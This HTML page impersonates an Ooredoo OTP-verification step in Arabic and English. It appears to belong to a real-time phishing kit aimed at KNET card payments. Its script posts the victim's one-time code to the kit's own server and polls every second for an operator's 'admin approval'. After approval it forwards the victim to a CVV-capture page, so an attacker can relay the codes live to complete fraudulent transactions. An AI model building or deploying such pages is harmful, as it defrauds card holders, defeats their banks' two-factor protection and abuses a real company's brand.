<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - أوريدو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 100%;
            padding: 30px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            width: 100px;
            height: 60px;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }

        .title {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
        }

        .form-section {
            margin-bottom: 25px;
        }

        .form-section.hidden {
            display: none;
        }

        .section-title {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            font-family: Arial, sans-serif;
        }

        input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
        }

        .info-box {
            background: #f9f9f9;
            border-right: 4px solid #0066cc;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #666;
        }

        .loading-container {
            display: none;
            text-align: center;
            padding: 40px 20px;
        }

        .loading-container.active {
            display: block;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 16px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .loading-subtext {
            font-size: 13px;
            color: #999;
        }

        .error-message {
            background: #fee;
            border: 1px solid #fcc;
            border-right: 4px solid #dc2626;
            color: #991b1b;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            display: none;
        }

        .error-message.active {
            display: block;
        }

        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 25px;
        }

        button {
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-cancel {
            background: #f0f0f0;
            color: #333;
        }

        .btn-cancel:hover {
            background: #e0e0e0;
        }

        .btn-submit {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            color: white;
            grid-column: 1 / -1;
        }

        .btn-submit:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 102, 204, 0.4);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .otp-inputs {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }

        .otp-input {
            width: 50px;
            height: 50px;
            font-size: 24px;
            text-align: center;
            border: 2px solid #ddd;
            border-radius: 5px;
        }

        .otp-input:focus {
            border-color: #0066cc;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .button-group {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">OTP</div>
            <div class="title">OTP Verification</div>
            <div class="subtitle">Enter the code sent to your phone</div>
        </div>

        <div id="errorMessage" class="error-message"></div>

        <!-- Form Section -->
        <div id="formSection" class="form-section active">
            <div class="info-box">
                تم إرسال رمز التحقق إلى رقم جوالك المسجل. يرجى إدخال الرمز المكون من 6 أرقام.
            </div>

            <div class="section-title">Enter OTP Code *</div>

            <div class="form-group">
                <input type="text" id="otpCode" placeholder="000000" maxlength="6" required>
            </div>

            <div class="button-group">
                <button class="btn-cancel" onclick="handleCancel()">Cancel</button>
                <button class="btn-submit" onclick="handleSubmit()">Verify OTP</button>
            </div>
        </div>

        <!-- Loading Section -->
        <div id="loadingSection" class="loading-container">
            <div class="spinner"></div>
            <div class="loading-text">جاري التحقق من الرمز</div>
            <div class="loading-subtext">يرجى الانتظار بينما نتحقق من رمز التحقق...</div>
        </div>
    </div>

    <script>
        let transactionId = null;
        let pollingInterval = null;

        // Get transaction ID from URL or localStorage
        function initializeTransaction() {
            const urlParams = new URLSearchParams(window.location.search);
            transactionId = urlParams.get('id') || localStorage.getItem('currentTransactionId');
            
            if (!transactionId) {
                window.location.href = '/myooredoo/knet-realtime.html';
            }
        }

        function handleCancel() {
            if (confirm('هل تريد إلغاء العملية؟')) {
                window.location.href = '/myooredoo/index.html';
            }
        }

        async function handleSubmit() {
            const otpCode = document.getElementById('otpCode').value;

            // Validation
            if (!otpCode || otpCode.length !== 6) {
                showError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
                return;
            }

            // Hide form and show loading
            document.getElementById('formSection').classList.remove('active');
            document.getElementById('loadingSection').classList.add('active');
            clearError();

            try {
                // Submit OTP data to server
                const response = await fetch(`/api/payment/${transactionId}/otp`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ otp: otpCode })
                });

                if (!response.ok) throw new Error('Failed to submit OTP data');

                // Start polling for admin approval
                startPolling();
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('formSection').classList.add('active');
                document.getElementById('loadingSection').classList.remove('active');
                showError('حدث خطأ في معالجة الطلب. يرجى المحاولة مرة أخرى.');
            }
        }

        function startPolling() {
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/payment/${transactionId}/status`);
                    if (!response.ok) throw new Error('Failed to fetch status');

                    const data = await response.json();

                    if (data.otpApproved === true) {
                        // OTP approved, move to CVV
                        clearInterval(pollingInterval);
                        window.location.href = `/myooredoo/cvv-realtime.html?id=${transactionId}`;
                    } else if (data.otpApproved === false) {
                        // OTP rejected
                        clearInterval(pollingInterval);
                        document.getElementById('loadingSection').classList.remove('active');
                        document.getElementById('formSection').classList.add('active');
                        showError('برجاء التحقق من الرمز المرسل عبر الجوال');
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 1000); // Poll every 1 second
        }

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.classList.add('active');
        }

        function clearError() {
            document.getElementById('errorMessage').classList.remove('active');
        }

        // Initialize on page load
        window.addEventListener('load', initializeTransaction);

        // Clean up polling on page unload
        window.addEventListener('beforeunload', () => {
            if (pollingInterval) clearInterval(pollingInterval);
        });
    </script>
</body>
</html>
